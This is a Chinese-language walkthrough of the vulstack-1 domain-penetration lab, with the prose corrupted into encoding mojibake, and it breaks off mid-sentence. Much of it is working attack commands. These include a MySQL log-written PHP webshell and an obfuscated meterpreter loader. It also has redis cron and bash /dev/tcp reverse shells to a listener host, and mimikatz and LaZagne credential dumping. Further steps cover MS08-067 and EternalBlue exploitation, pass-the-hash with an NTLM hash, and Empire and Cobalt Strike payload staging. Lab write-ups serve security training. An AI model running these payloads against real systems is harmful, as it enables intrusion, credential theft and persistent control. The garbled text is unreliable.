æ˜¨å¤©çœ‹åˆ°çº¢æ—¥å®‰å…¨å‘äº†vulstack-1çš„wpï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼Œå¾ˆå¤šæ€è·¯åœ¨æˆ‘ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™éƒ½æ²¡æœ‰ç”¨åˆ°ï¼Œäºæ˜¯æ‰“ç®—è·Ÿç€wpå†å­¦ä¹ ä¸€ä¸‹ã€‚ ä¸€ã€ç¯å¢ƒæ­å»ºwin7-ä»…ä¸»æœº+NAT win2003-ä»…ä¸»æœº win2008-ä»…ä¸»æœº ç½‘ç»œæ‹“æ‰‘å›¾ è¾¹ç•Œæœºwin7ï¼š192.168.52.143ï¼Œ169.254.129.186 åŸŸæˆå‘˜win2003ï¼š192.168.52.141 åŸŸæ§win2008ï¼š192.168.52.138 æµ‹è¯•è¿é€šæ€§ win7å¯ä»¥pingé€šå¦ä¸¤å°ï¼Œä½†æ˜¯å¦å¤–ä¸¤å°pingä¸é€šwin7ï¼Œ å¯èƒ½ç”±äºWin7å¼€å¯äº†é˜²ç«å¢™ä¸”è¿‡æ»¤äº†ICMPæ•°æ®åŒ…ï¼Œæ‰€ä»¥åœ¨åç»­ä¿¡æ¯æ”¶é›†é˜¶æ®µçš„æ´»è·ƒä¸»æœºæ¢æµ‹æ—¶ä¸èƒ½ä½¿ç”¨-sP. äºŒã€ä¿¡æ¯æ”¶é›†æ¢æµ‹ä¸»æœº 1nmap -sn 192.168.56.0&#x2F;24 å¾—åˆ°ç›®æ ‡ipä¸º192.168.56.129 ç«¯å£æ‰«æ 1nmap -sS -sV -T5 -A -p- 192.168.1.129 ç›®å½•æ‰«æ 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.129 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-large-directories.txt -x .php,.txt,.html é‚£ä¸ªbeifen.raræ²¡æ‰«å‡ºæ¥ï¼Œå­—å…¸ä¸å¤Ÿå¼ºå¤§ï¼Œç•¥è¿‡ ä¸‰ã€getshellå­˜åœ¨phpmyadminä»¥åŠphpinfo.php root/rootå¼±å£ä»¤ç™»å½•ï¼Œphpinfo.phpæŸ¥çœ‹ç½‘ç«™ç»å¯¹è·¯å¾„C:/phpStudy/WWW æŸ¥çœ‹sqlè¯­å¥èƒ½å¦æ–‡ä»¶å†™å…¥ 1show variables like &#39;%secure%&#39; secure_file_priv=NULL å› æ­¤æ— æ³•é€šè¿‡into outfileå†™å…¥ è¿™é‡Œå¯ä»¥é€šè¿‡mysqlæ—¥å¿—å†™å…¥çš„æ–¹å¼getshell 12set global general_log &#x3D; &quot;ON&quot;SET global general_log_file&#x3D;&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;eval.php&quot; æ’å…¥ä¸€å¥è¯ 1SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;; èšå‰‘è¿æ¥æˆåŠŸ å››ã€åŸŸæ¸—é€1ipconfig &#x2F;all å‘ç°åœ¨god.orgåŸŸä¸­ é¦–å…ˆç»™msfå¼¹ä¸ªshellï¼Œå› ä¸ºå­˜åœ¨webæœåŠ¡ï¼Œæˆ‘ä»¬ç”¨msfvenomç”Ÿæˆä¸€ä¸ªshellcodeï¼Œè€Œä¸æ˜¯peæ–‡ä»¶ 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;3333 -f raw &gt; test.php è¿™é‡Œæ˜¾ç„¶æ²¡æœ‰æ€è½¯ï¼Œå¦‚æœæœ‰ï¼Œä¹‹å‰çš„ä¸€å¥è¯æœ¨é©¬åº”è¯¥æ˜¯å†™ä¸è¿›å»çš„ å…æ€payload åŠ å¯† 123$code = file_get_contents('test.php');$encode = base64_encode(gzdeflate($code));echo $encode; é»‘åå• 123456789101112$l = 'baSe6';$o = '4_dE';$v = 'cO';$e = 'DE';$love = $l.$o.$v.$e;$c = \"love\";$a = $$c('cGhwaW5mbygpOwo=');eval($a);$a = strrev('EdOcEd_46eSaB');$b = $a('cGhwaW5mbygpOwo=');eval($b); ç»¼åˆä¸Šé¢ä¸¤ä¸ªï¼Œæœ€åçš„test1.php 123456&lt;?php$a = strrev('EdOcEd_46eSaB');$c = strrev('eTALfNizG');$b = $a('lVNtb9MwEP4rpopmRyoZHQiNlkmUaSBE2RDtt2myHOfSWs3sKHb3oir/nbPd9IUxDfIp9j33vFwu0DSm4Q3UpnFKz9mbdEQSVZMzQgcfTrLB+9NskA1OTileewwW3uIzIqokjCWlB1rXgLjl1sglOC4rBdrRlBwdEWW5FFUl8goQm6ZkTRKLLUnJek7Ww+PjNYq1w3Xgbnte3HL3WMOOF5XboPYKW5FzI1p6OVODflEJFfrR/H/Qd2EQ4uBFifEX/u3yYtYn06vz73w6+3Ux/uEPEz47/+lVG/DITx2r0RqkY4ntkwN30QeCPXmhgKXe3b7nQLDvOZQ6ONWGRAgpV1pamu4hn4Ji2d4rJxcYfMclhYXtgIYkqUCjeonHIph+h405npajDhr5ttBN0L81dH4QeJhSYN9K10IuWe8Sq71+YPPji6SJuKb4Rm/wJvfTwDncL1QFhKFVrLAkT8lH0lH/Q7CcZPu5fOfrHdfzKUPfnyGf7W59vK+Tq8/jyfSa3tq576Q3PpIdPa0Et5tyeI+LAQ8OtFVG88qIAgpG7WphrOr+AK34HNz2NoMHkCtnmqxQ1i8thztR0c3eRgzPH2th7Vlcc+53xqEAoxTT5OF3OQDGLwUVDmNNPB0LqHbzFX8D');$d = $c($b);eval($d); msfå¼€å¯ç›‘å¬ 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 3333exploit è¿›ç¨‹è¿ç§» æ³¨æ„ï¼šä»…Windowsæœ¬æœºmeterpreterï¼ˆwindows / meterpreter / reverse_tcpï¼‰æ”¯æŒè¿ç§»ã€‚ from PHP meterpreter to native meterpreter with sessions -u 3 12psmigrate 2596 msfææƒæ–¹æ³•getsystemææƒ 12meterpreter &gt; getsystem[-] Unknown command: getsystem. expææƒ ç»•è¿‡UACè¿›è¡Œææƒ 123exploit&#x2F;windows&#x2F;local&#x2F;bypassuacexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbsexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection æé«˜ç¨‹åºè¿è¡Œçº§åˆ« 1exploit&#x2F;windows&#x2F;local&#x2F;ask windowsææƒæ¼æ´ å¦‚ms13_053,ms14_058,ms16_016,ms16_032ç­‰ ================è¿™é‡Œä¸€å¼€å§‹å‡ºç°äº†ç‚¹é—®é¢˜ èŠ±äº†åŠå¤©æ²¡æå¥½ã€‚ã€‚ä¸»è¦æ˜¯ç½‘ä¸ŠåŸºæœ¬æ²¡æœ‰ç›¸å…³çš„ï¼Œè¿˜æœ‰ä¸ªè§£ç­”æ˜¯msfçš„ç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘ä¸‹äº†å¥½å‡ ä¸ªç‰ˆæœ¬+proä¹Ÿä¸è¡Œã€‚ã€‚ã€‚åªæœ‰githubä¸Šæœ‰ä¸ªissueï¼Œåªæ˜¯æåˆ°äº†The target machine is Windows7 x64 ä¸è¿‡æœ€åè¿˜æ˜¯è§£å†³å•¦ ===========================åˆ†å‰²çº¿ ä½¿ç”¨cobaltstrike teamserverå¯åŠ¨æœåŠ¡ï¼Œä¸Šçº¿ï¼ŒListenerï¼Œgenerateç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶artifact.exeï¼ˆå› ä¸ºå½“å‰ç¯å¢ƒæ²¡æœ‰æ€è½¯ï¼Œæ•…ä¸è€ƒè™‘å…æ€ï¼‰ï¼Œå¯åŠ¨ä¹‹ååªè¦è¿›ç¨‹ä¸è¢«æ€æ‰ï¼Œéšæ—¶å¯ä»¥ä¸Šçº¿ã€‚ å¼€å¯è¿œç¨‹æ¡Œé¢è¿æ¥ é€šè¿‡cmdåˆ›å»ºç”¨æˆ·ï¼Œ ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥æ‰§è¡Œæ–‡ä»¶ è¿™é‡Œçš„cmdå¯ä»¥è€ƒè™‘èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯,è¿˜æœ‰å›æ˜¾,meterpreterçš„shellæ²¡æœ‰å›æ˜¾ 123net user gqy test@1233 &#x2F;add net localgroup administrators gqy &#x2F;addREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f è‹¥ç›®æ ‡ä¸»æœºå¼€å¯äº†é˜²ç«å¢™é™åˆ¶äº†3389çš„è¿œç¨‹è¿æ¥ï¼Œå¯åå¼¹ä¸€ä¸ªmsfçš„shellå›æ¥ï¼Œå°è¯•å…³é—­é˜²ç«å¢™ 1meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp èšå‰‘cmdå…³é—­é˜²ç«å¢™ 1netsh adcfirewall set allprofiles state off è¿œç¨‹æ¡Œé¢OWA\\gqy test@1233æˆåŠŸè¿ä¸Š æ³¨æ„è¿™é‡Œæœ‰æ—¶å€™å‰é¢è·Ÿçš„æ˜¯åŸŸ meterpreterä¸Šä¼ å¹¶æ‰§è¡Œæ–‡ä»¶ 12upload &#x2F;tmp&#x2F;artifact.exe C:&#x2F;Windowsexecute -f artifact.exe csä¸msfè”åŠ¨å…ˆæ–°å»ºä¸€ä¸ªforeign Listenerï¼Œç„¶åæŠŠæƒ³æ´¾ç”Ÿçš„shellå³é”®spawné€‰æ‹©æ–°å»ºçš„foreignlistener msfç›‘å¬ 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 1233exploit å› ä¸ºæ˜¯windows/meterpreter/reverse_tcpï¼Œè¿™ä¸ªshellæ˜¯å¯ä»¥ç›´æ¥è¿›ç¨‹è¿ç§»çš„ è·å–å¯†ç æˆ–hashDump Hashes+Run Mimikatz ä½¿ç”¨LaZagneæŠ“å–æ‰€æœ‰æ”¯æŒè½¯ä»¶çš„å¯†ç  meterpreteræˆ–csä¸Šä¼ ï¼Œ csæ‰§è¡Œ 1bracon&gt;shell laZagne.exe all msfè¿›å…¥shellæ‰§è¡Œ 1laZagne.exe all ä¿¡æ¯æ”¶é›†cmd 1ipconfig &#x2F;all beacon 12shell net config Workstationnet view å¾—åˆ°192.168.52.138æ˜¯åŸŸæ§ å†…ç½‘æ”¶é›†æŸ¥çœ‹windwosæ¼æ‰“çš„è¡¥ä¸ https://github.com/AonCyberLabs/Windows-Exploit-Suggester 123456789run post&#x2F;windows&#x2F;gather&#x2F;checkvm #æ˜¯å¦è™šæ‹Ÿæœºrun post&#x2F;linux&#x2F;gather&#x2F;checkvm #æ˜¯å¦è™šæ‹Ÿæœºrun post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #æŸ¥çœ‹åˆ†åŒºrun post&#x2F;windows&#x2F;gather&#x2F;enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯run post&#x2F;windows&#x2F;gather&#x2F;dumplinks #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œrun post&#x2F;windows&#x2F;gather&#x2F;enum_ie #è·å–IEç¼“å­˜run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome #è·å–Chromeç¼“å­˜run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #è¡¥ä¸ä¿¡æ¯run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #æŸ¥æ‰¾åŸŸæ§ æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ 1run get_local_subnets æ·»åŠ è·¯ç”±å¹¶æ‰«æ 12run autoroute -s 192.168.52.0&#x2F;24run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24 å‰é¢çœ‹åˆ°é¶æœºå­˜åœ¨nmapï¼Œä½¿ç”¨nmapçš„ç«¯å£æ‰«æ 12nmap --script&#x3D;vuln 192.168.52.141nmap --script&#x3D;vuln 192.168.52.138 192.168.52.141 192.168.52.138 å†…ç½‘æ”»å‡»å§¿åŠ¿-MS08-067 MS08-067æ¼æ´æ˜¯é€šè¿‡MSRPC over SMBé€šé“è°ƒç”¨ServeræœåŠ¡ç¨‹åºä¸­çš„NetPathCanonicalizeå‡½æ•°æ—¶è§¦å‘çš„ï¼Œè€ŒNetPathCanonicalizeå‡½æ•°åœ¨è¿œç¨‹è®¿é—®å…¶ä»–ä¸»æœºæ—¶ï¼Œä¼šè°ƒç”¨NetpwPathCanonicalizeå‡½æ•°ï¼Œå¯¹è¿œç¨‹è®¿é—®çš„è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–ï¼Œè€Œåœ¨NetpwPathCanonicalizeå‡½æ•°ä¸­å­˜åœ¨çš„é€»è¾‘é”™è¯¯ï¼Œé€ æˆæ ˆç¼“å†²åŒºå¯è¢«æº¢å‡ºï¼Œè€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼‰ã€‚ æ‰“payloadä¹‹å‰éœ€è¦åå‘ä»£ç†ï¼ˆautorouteåªç”¨äºæ‰«æï¼‰ï¼Œæˆ‘ç”¨ew ä¸Šä¼ åˆ°é¶æœº 1ew_for_Win.exe -s rssocks -d 192.168.1.130 -e 8888 kali 1.&#x2F;ew_for_Linux32 -s rcsocks -l 1080 -e 8888 proxychainså¯åŠ¨msfconsole ä¸è®¾ç½® payloadï¼Œæ”»é™·åç›´æ¥è·å¾—é¶æœº1çš„cmdè€Œä¸æ˜¯meterpreter æ³¨æ„ä¸‹å¦‚æœå‰é¢ç”¨äº†åå‘ä»£ç†ï¼Œè¿™é‡Œpayloadéœ€è¦ç”¨æ­£å‘ 12345search ms08-067use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapiset RHOSTS 192.168.52.141set payload windows&#x2F;meterpreter&#x2F;bind_tcprun å‘ç°ä¸å¤ªç¨³å®šï¼Œè¿›ç¨‹è¿ç§»ä¹Ÿæ˜¯ä¸€æ · mimikatzæ’ä»¶é€šè¿‡mimikatzæ’ä»¶å¯ä»¥æŸ¥çœ‹ä¸»æœºæ‰€åœ¨åŸŸï¼Œä»¥åŠå¯†ç æ”¶é›† 12345load mimikatzmimikatz_command -f system::computermimikatz_command -f samdump::hashesmimikatz_command -f sekurlsa::searchPasswordswdigest æ²¡æœ‰æˆåŠŸæŠ“åˆ° å†…ç½‘æ”»å‡»å§¿åŠ¿-SMBè¿œç¨‹æ¡Œé¢å£ä»¤çŒœæµ‹1search smb_login 123456use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginmsf exploit (smb_login)&gt;set rhosts 192.168.127.235msf exploit (smb_login)&gt;set user_file &#x2F;root&#x2F;Pentest&#x2F;user.txtmsf exploit (smb_login)&gt;set pass_file &#x2F;root&#x2F;Pentest&#x2F;pass.txtmsf exploit (smb_login)&gt;set stop_on_success truemsf exploit (smb_login)&gt;exploit å†…ç½‘æ”»å‡»å§¿åŠ¿-Oracleæ•°æ®åº“ TNSæœåŠ¡æ¼æ´ oracle TNS Listenerè¿œç¨‹æŠ•æ¯’ï¼ˆCVE-2012-1675ï¼‰ 1use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnspoison_checker TNSä¸Šçš„ç¼“å†²åŒºæ¼æ´ï¼ˆCVE-2009-1979ï¼‰ 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_auth_sesskey CVE-2002-0965MSFä¸­æ¼æ´åˆ©ç”¨æ¨¡å— 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_service_name å†…ç½‘æ”»å‡»å§¿åŠ¿-RPC DCOMæœåŠ¡æ¼æ´ å¾®è½¯ä¿®æ”¹dcerpcæ¡†æ¶åå½¢æˆè‡ªå·±çš„RPCæ¡†æ¶æ¥å¤„ç†è¿›ç¨‹é—´çš„é€šä¿¡ã€‚å¾®è½¯çš„RPCæ¡†æ¶åœ¨å¤„ç†TCP/IPä¿¡æ¯äº¤æ¢è¿‡ç¨‹ä¸­å­˜åœ¨çš„ç•¸å½¢æ¶ˆæ¯æ—¶ï¼Œæœªæ­£ç¡®å¤„ç†ï¼Œå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼›æ­¤æ¼æ´å½±å“ä½¿ç”¨RPCæ¡†æ¶çš„DCOMæ¥å£ï¼ŒDCOMæ¥å£ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯æœºå™¨å‘é€ç»™æœåŠ¡å™¨çš„DCOMå¯¹è±¡æ¿€æ´»è¯·æ±‚ï¼Œå¦‚UNCè·¯å¾„ã€‚ 1234search ms03_026use exploit&#x2F;windows&#x2F;dcerpc&#x2F;ms03_026_dcomset rhosts 192.168.52.141run æ²¡æˆåŠŸ å†…ç½‘æ”»å‡»å§¿åŠ¿- MS17-0101234search ms17-010use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.52.141run æ²¡æˆåŠŸï¼Œå¯èƒ½æ˜¯ç”±äºå‰é¢æ‰“äº†ä¸€äº›åˆ«çš„payload é’“é±¼æ”»å‡»è¿™ä¸ªä¹‹å‰è¿˜çœŸæ²¡æè¿‡ å¿«æ·æ–¹å¼ é’“é±¼é“¾æ¥ ä½†æ˜¯ä¸‹è½½å®Œæˆä¹‹åè¿˜éœ€è¦è¿è¡Œï¼Œå› æ­¤éœ€è¦ä¸€å®šçš„ä¼ªè£…æŠ€å·§ï¼Œæ¯”å¦‚Clone Site okï¼Œä¸ŠåŠéƒ¨åˆ†è‡³æ­¤å°±ç»“æŸäº† å†…ç½‘å…¶ä»–ä¸»æœºç«¯å£-redis Getshell1proxychains redis-cli -h 192.168.52.138 â‘ é€šè¿‡å†™SSH keyçš„æ–¹å¼è¿›è¡Œgetshell 1234567891011ç”Ÿæˆå¯†é’¥å¯¹ssh-keygen -t rsaå°†ç”Ÿæˆçš„å…¬é’¥å†™å…¥åˆ°æ–‡ä»¶ä¸­(echo -e &quot;\\n\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n\\n&quot;) &gt; pub.txtè®¾ç½®è·¯å¾„ã€æ–‡ä»¶ã€å†™å…¥å…¬é’¥ config set dir &#x2F;root&#x2F;.ssh&#x2F;config set dbfilename &quot;authorized_keys&quot;saveexitè¿æ¥ssh -i id_rsa root@192.168.2.155 â‘¡å‘Webç›®å½•ä¸­å†™webshellçš„æ–¹å¼è¿›è¡Œgetshell 123456flushdbconfig set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename &quot;gaia.php&quot;set gaia &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;saveexit â‘¢rediså†™å®šæ—¶ä»»åŠ¡åå¼¹shell 1234config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootset x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.155&#x2F;2333 0&gt;&amp;1\\n&quot;save å†…ç½‘å…¶ä»–ä¸»æœºç«¯å£-Mysqlææƒ 1.UDFææƒudfæ˜¯Mysqlç±»ææƒçš„æ–¹å¼ä¹‹ä¸€ã€‚å‰ææ˜¯å·²çŸ¥mysqlä¸­rootçš„è´¦å·å¯†ç ï¼Œæˆ‘ä»¬åœ¨æ‹¿åˆ°webshellåï¼Œå¯ä»¥çœ‹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„config.phpé‡Œï¼Œä¸€èˆ¬éƒ½æœ‰mysqlçš„è´¦å·å¯†ç ã€‚åˆ©ç”¨rootæƒé™ï¼Œåˆ›å»ºå¸¦æœ‰è°ƒç”¨cmdå‡½æ•°çš„â€™udf.dllâ€™(åŠ¨æ€é“¾æ¥åº“)ã€‚å½“æˆ‘ä»¬æŠŠâ€™udf.dllâ€™å¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹å¼•å…¥Mysqlæ—¶ï¼Œå…¶ä¸­çš„è°ƒç”¨å‡½æ•°æ‹¿å‡ºæ¥å½“ä½œmysqlçš„å‡½æ•°ä½¿ç”¨ã€‚è¿™æ ·æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°æ‰è¢«å½“ä½œæœ¬æœºå‡½æ•°æ‰§è¡Œã€‚åœ¨ä½¿ç”¨CREAT FUNCITONè°ƒç”¨dllä¸­çš„å‡½æ•°åï¼Œmysqlè´¦å·è½¬åŒ–ä¸ºsystemæƒé™ï¼Œä»è€Œæ¥ææƒã€‚2.MOFææƒæ‰˜ç®¡å¯¹è±¡æ ¼å¼ (MOF) æ–‡ä»¶æ˜¯åˆ›å»ºå’Œæ³¨å†Œæä¾›ç¨‹åºã€äº‹ä»¶ç±»åˆ«å’Œäº‹ä»¶çš„ç®€ä¾¿æ–¹æ³•ã€‚æ–‡ä»¶è·¯å¾„ä¸ºï¼šc:/windows/system32/wbme/mof/ï¼Œå…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚MOFæ–‡ä»¶æ¯äº”ç§’å°±ä¼šæ‰§è¡Œï¼Œè€Œä¸”æ˜¯ç³»ç»Ÿæƒé™ï¼Œé€šè¿‡mysqlä½¿ç”¨load_file å°†æ–‡ä»¶å†™å…¥/wbme/mofï¼Œç„¶åç³»ç»Ÿæ¯éš”äº”ç§’å°±ä¼šæ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬ä¸Šä¼ çš„MOFã€‚MOFå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶è¿™æ®µvbsè„šæœ¬çš„å†…å®¹è®©ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œææƒã€‚ sqlmapä¸€æŠŠæ¢­ 1sqlmap -d &quot;mysql:&#x2F;&#x2F;root:123456@node3.buuoj.cn:26002&#x2F;mysql&quot; --os-shell PTH pass-the-hashï¼Œåœ¨Windowsç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨NTLMèº«ä»½è®¤è¯ï¼ŒNTLMè®¤è¯ä¸ä½¿ç”¨æ˜æ–‡å£ä»¤ï¼Œè€Œæ˜¯ä½¿ç”¨å£ä»¤åŠ å¯†åçš„hashå€¼ï¼Œhashå€¼ç”±ç³»ç»ŸAPIç”Ÿæˆ(ä¾‹å¦‚LsaLogonUser)ï¼Œåˆ†ä¸ºLM hashå’ŒNT hashï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†hashï¼Œå°±èƒ½å¤Ÿåœ¨èº«ä»½éªŒè¯çš„æ—¶å€™æ¨¡æ‹Ÿè¯¥ç”¨æˆ·(å³è·³è¿‡è°ƒç”¨APIç”Ÿæˆhashçš„è¿‡ç¨‹)ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡LM Hashå’ŒNTLM Hashè®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸ç”¨æä¾›æ˜æ–‡å¯†ç ã€‚è¿™ç±»æ”»å‡»é€‚ç”¨äºï¼šåŸŸ/å·¥ä½œç»„ç¯å¢ƒï¼Œå¯ä»¥è·å¾—hashï¼Œä½†æ˜¯æ¡ä»¶ä¸å…è®¸å¯¹hashçˆ†ç ´ï¼Œå†…ç½‘ä¸­å­˜åœ¨å’Œå½“å‰æœºå™¨ç›¸åŒçš„å¯†ç ï¼Œä»windowsåˆ°windowsæ¨ªå‘pthè¿™ä¸€ç±»æ”»å‡»æ–¹æ³•æ¯”è¾ƒå¹¿æ³› ä¸Šä¼ ä¸€ä¸ªmimkatz åˆ©ç”¨ä¹‹å‰logonpasswordså¾—åˆ°çš„hash 123mimikatzprivilege:debug sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:god.org &#x2F;ntlm:8601a88798be6a3948fce638a5790741 è¿™æ—¶å€™å°±å¯ä»¥å°±ipcè¿æ¥äº† åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨] WMIæ˜¯ä¸€ä¸ªç³»ç»Ÿæ’ä»¶,ç”¨äºåœ¨æœ¬åœ°è¿œç¨‹ç®¡ç†è®¡ç®—æœºçš„è¿›ç¨‹,æœåŠ¡,æ³¨å†Œè¡¨ç­‰å…¶å®ƒçš„ä¸€ç³»åˆ—çš„ç‰¹æƒæ“ä½œ ä½¿ç”¨msf 1234567use exploit&#x2F;windows&#x2F;local&#x2F;wmiset SMBUser administratorset SMBPass vulstack@1set payload windows&#x2F;meterpreter&#x2F;bind_tcpset SMBDomain god.orgset session 3run å¤±è´¥äº†ï¼Œæˆ–è€…ä½¿ç”¨wmiexec 1234567git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binariespython setup.py installcd examplesproxychains python wmiexec.py -debug &#39;administrator:vulstack@1@192.168.52.138&#39;proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:8601a88798be6a3948fce638a5790741 &#39;administrator@192.168.52.138&#39; æˆ–è€…è¿™ä¸ªï¼šhttps://github.com/Kevin-Robertson/Invoke-TheHash å…ˆä¸Šä¼  1Import-Moudle .\\Invoke-TheHash.psd1 1Invoke-WMIExec -Target 192.168.52.138 -Domain workgroup -Username administrator -Hash 8601a88798be6a3948fce638a5790741 -Command &quot;calc.exe&quot; -verbose è¿™ä¸ªå¾—å¾—åˆ°ä¸€ä¸ªpsçš„shell è¿™é‡Œä½¿ç”¨Empire https://github.com/BC-SECURITY/Empire 1234uselistener httpset Port 8080set Name testexecute 12backlist 12345usestagerï¼ˆç©ºæ ¼+tabï¼‰usestager windows&#x2F;launcher_batinfoset Listener testexecute ç”Ÿæˆlauncher.bat 123@echo offstart &#x2F;b powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AHAAZQAoACcAUwB5AHM...start &#x2F;b &quot;&quot; cmd &#x2F;c del &quot;%~f0&quot;&amp;exit &#x2F;b æ”¶åˆ°äº†è¯·æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰agents 123usestager launcher_vbs testset Listener testexecute æ²¡æˆåŠŸ å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘æˆ‘ä¸»è¦æ˜¯é€šè¿‡ew Frpå†…ç½‘ç©¿é€æŠŠè‡ªå·±çš„kaliæ”¾åˆ°å…¬ç½‘ä¸Šï¼Œå‚è€ƒä¹‹å‰çš„æ–‡ç«  https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/ CSä¸Šçº¿å†…ç½‘ä¸»æœºproxychainså¯åŠ¨csï¼Œå¹¶æ‰§è¡Œ ç”Ÿæˆbeacon.exe åˆ©ç”¨ipcä¸Šä¼ æˆ–è€…smbclientä¸Šä¼  1copy beacon.exe \\\\192.168.52.138\\c$ 12proxychains smbclient &#x2F;&#x2F;192.168.52.138&#x2F;c$ -U administratorput &#x2F;tmp&#x2F;beacon.exe åˆ©ç”¨wmiæ‰§è¡Œ æˆåŠŸä¸Šçº¿ SSHéš§é“ è¿™ç§ä»£ç†æ–¹å¼éœ€è¦æ¯”è¾ƒé«˜çš„æƒé™(system/root)ç›´æ¥ä½¿ç”¨ç³»ç»ŸåŠŸèƒ½æ¥å¼€å¯å†…ç½‘ä»£ç†çš„éš§é“ï¼Œé€šè¿‡SSHéš§é“è¿›è¡Œä»£ç† 12ssh -qTfnN -L port:host:hostport -l user remote_ip #æ­£å‘éš§é“ï¼Œç›‘å¬æœ¬åœ°portssh -qTfnN -R port:host:hostport -l user remote_ip #åå‘éš§é“ï¼Œç”¨äºå†…ç½‘ç©¿é€é˜²ç«å¢™é™åˆ¶ä¹‹ç±» 12ssh -CfNg -L port1:127.0.0.1:port2 user@host #æœ¬åœ°è½¬å‘ssh -CfNg -R port2:127.0.0.1:port1 user@host #è¿œç¨‹è½¬å‘ æŒä¹…æ§åˆ¶åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›† 123456net localgroup administrator &#x2F;domainnet group &#x2F;domainnet group &quot;domain admins&quot; &#x2F;domainnet user &#x2F;domaindsquery usernet accounts &#x2F;domain åˆ©ç”¨SPNå¿«é€Ÿæ‰«æåŸŸå†…å­˜æ´»ç›¸å…³æœåŠ¡ä»¥åŠå¿«é€Ÿå®šä½æœåŠ¡å™¨ 1setspn -T OWA-god.god.org -Q *&#x2F;* HTTP Listeneräº¤äº’ä¿¡æ¯éšè— 1.å°†Cobalt Strikeé…ç½®æ–‡ä»¶è½¬æ¢ä¸ºåŠŸèƒ½æ€§çš„mod_rewrite .htaccessæˆ–Nginxé…ç½®æ–‡ä»¶ï¼Œä»¥æ”¯æŒå°†HTTPåå‘ä»£ç†é‡å®šå‘åˆ°Cobalt Strikeå›¢é˜ŸæœåŠ¡å™¨ã€‚ä½¿ç”¨åå‘ä»£ç†å¯ä»¥ä¿æŠ¤åç«¯C2æœåŠ¡å™¨å…å—åˆ†æï¼Œè°ƒæŸ¥å’Œä¸€èˆ¬InternetèƒŒæ™¯è¾å°„ã€‚https://github.com/threatexpress/cs2modrewrite2.Cobalt Strikeé€šè¿‡Malleable 